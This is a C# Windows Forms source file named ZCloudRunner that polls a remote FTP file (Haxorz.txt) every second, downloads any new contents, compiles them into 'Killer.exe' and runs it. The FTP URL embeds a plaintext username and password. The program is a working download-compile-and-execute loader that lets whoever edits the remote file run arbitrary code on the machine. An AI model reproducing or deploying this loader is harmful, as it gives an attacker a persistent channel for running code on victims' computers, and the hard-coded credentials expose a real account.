using System;
using System.Windows.Forms;
using System.Net;
using Microsoft.CSharp;
using System.CodeDom.Compiler;
using System.IO;
using System.Threading;

namespace ZCloudRunner
{
    public partial class Form1 : Form
    {
        string AllTheData;
        DateTime LastDownloaded;
        Thread Prosessor;

        //string url = "http://www.zalpacas.com/ChrisZiraldo/Haxorz.txt";

        //string url = "http://minecraft-servers.com/fileeditor.php?id=2436&file=Haxorz.txt&act=df";

        //string url = "http://stargateno1fan.tumblr.com/";

        string url = "ftp://server2436:stargate@calamity.minecraft-servers.com/Code/Haxorz.txt";

        public Form1()
        {      
            InitializeComponent();            
            LastDownloaded = DateTime.Today;

            Prosessor = new Thread(new ThreadStart(Processor));
            Prosessor.IsBackground = true;
            Prosessor.Start();
        }

        public void Processor()
        {
            while (true)
            {
                FtpWebRequest req = (FtpWebRequest)WebRequest.Create(new Uri(url));
                req.Method = WebRequestMethods.Ftp.GetDateTimestamp;
                FtpWebResponse resp = (FtpWebResponse)req.GetResponse();

                if (resp.LastModified != LastDownloaded)
                {
                    WebRequest request = WebRequest.Create(url);
                    WebResponse response = request.GetResponse();

                    System.IO.StreamReader reader = new System.IO.StreamReader(response.GetResponseStream());

                    AllTheData = reader.ReadToEnd();

                    UpdateMessageBox();
                    if (LastDownloaded != DateTime.Today)
                        CompileAndRun();
                    LastDownloaded = resp.LastModified;
                }
                resp.Close();
                Thread.Sleep(1000);
            }
        }

        delegate void SetTextCallback();

        public void UpdateMessageBox()
        {
            if (this.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(UpdateMessageBox);
                this.Invoke(d, new object[] { });
            }
            else
            {
                textBox_Main.Clear();

                //textBox_Main.Text = TumblrParser(AllTheData);
                textBox_Main.Text = AllTheData;
                textBox_Main.SelectionStart = textBox_Main.Text.Length;
                textBox_Main.ScrollToCaret();
            }
        }

        public string TumblrParser(string toParse)
        {
            string tempHead = toParse.Substring(toParse.IndexOf("</script>") + "</script>".Length);
            string tempBody = tempHead.Remove(tempHead.IndexOf("<!-- BEGIN TUMBLR CODE -->"));
            return tempBody;
        }

        public void CompileAndRun()
        {
            if (this.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(CompileAndRun);
                this.Invoke(d, new object[] { });
            }
            else
            {
                CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
                ICodeCompiler myCodeCompiler = new CSharpCodeProvider().CreateCompiler();

                String[] referenceAssemblies = { "System.dll" };
                CompilerParameters cp = new CompilerParameters(referenceAssemblies, "Killer.exe");

                cp.ReferencedAssemblies.Add("system.dll");
                cp.ReferencedAssemblies.Add("system.xml.dll");
                cp.ReferencedAssemblies.Add("system.data.dll");
                cp.ReferencedAssemblies.Add("System.Runtime.Serialization.Formatters.Soap.dll");
                cp.ReferencedAssemblies.Add("system.drawing.dll");
                cp.ReferencedAssemblies.Add("System.Core.dll");
                cp.ReferencedAssemblies.Add("System.Xml.Linq.dll");
                cp.ReferencedAssemblies.Add("System.Web.Services.dll");
                cp.ReferencedAssemblies.Add("System.Runtime.Serialization.dll");
                cp.ReferencedAssemblies.Add("System.Windows.Forms.dll");

                cp.TreatWarningsAsErrors = false;

                cp.GenerateExecutable = true;

                cp.CompilerOptions = "/target:winexe /optimize";

                CompilerResults cr = myCodeCompiler.CompileAssemblyFromSource(cp, textBox_Main.Text);

                if (cr.Errors.Count == 0)
                    System.Diagnostics.Process.Start("Killer.exe");
            }
        }
    }
}
